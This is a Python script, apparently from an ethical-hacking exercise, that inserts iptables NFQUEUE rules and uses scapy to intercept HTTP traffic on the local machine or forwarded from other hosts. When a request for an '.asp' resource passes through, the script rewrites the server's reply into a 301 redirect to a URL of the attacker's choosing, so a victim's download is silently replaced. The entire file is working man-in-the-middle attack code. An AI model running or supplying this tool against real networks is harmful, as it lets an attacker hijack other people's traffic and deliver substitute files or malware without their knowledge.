#!/usr/bin/env python

import netfilterqueue
import subprocess
from optparse import OptionParser
import scapy.all as scapy

ack_list= []
#This program is use to download any other stuffs if clicked on any particular downloading stuff
def process(packets):
    scapy_packets = scapy.IP(packets.get_payload())
    if scapy_packets.haslayer(scapy.Raw):
        if scapy_packets[scapy.TCP].dport == 80:
            if ".asp" in scapy_packets[scapy.Raw].load :
                print("[+] The Request ")
                ack_list.append(scapy_packets[scapy.TCP].ack)
        elif scapy_packets[scapy.TCP].sport == 80:
            if scapy_packets[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packets[scapy.TCP].seq )
                print("[+] .asp ")
                scapy_packets[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.sciencemag.org%2Fnews%2F2019%2F11%2Fhere-s-better-way-convert-dog-years-human-years-scientists-say&psig=AOvVaw1b1lbtu8tuQg7qmje5tXJZ&ust=1601379323110000&source=images&cd=vfe&ved=0CAIQjRxqFwoTCNDUxoHhi-wCFQAAAAAdAAAAABAD\n"
                del scapy_packets[scapy.IP].len
                del scapy_packets[scapy.IP].chksum
                del scapy_packets[scapy.TCP].chksum
        packets.set_payload(str(scapy_packets))

    packets.accept()

def QueueIpMY(num):
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", num])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", num])

def QueueIpOTHER(num):
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", num])

def DequeueIp():
    subprocess.call(["iptables","-F"])

def get_value():
    parse =OptionParser()
    parse.add_option("-n", "--num", dest="num", help="Enter the queue number using -n or -num")
    parse.add_option("-o", "--operatingsys", dest="OS", help="Enter whose network want to cut (kali/other)")
    (value,other) = parse.parse_args()
    if not value.num:
        parse.error("[-] Please specify the number")
    elif not value.OS:
        parse.error("[-] Please specify the os(kali/other)")
    return value

def configure(num):

    if num.OS in "kali":
        QueueIpMY(num.num)
    else:
        QueueIpOTHER(num.num)


try:
    num = get_value()
    configure(num)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(num.num),process)
    queue.run()
except KeyboardInterrupt:
    print("[+] Exiting the process and flushing the table")
    DequeueIp()
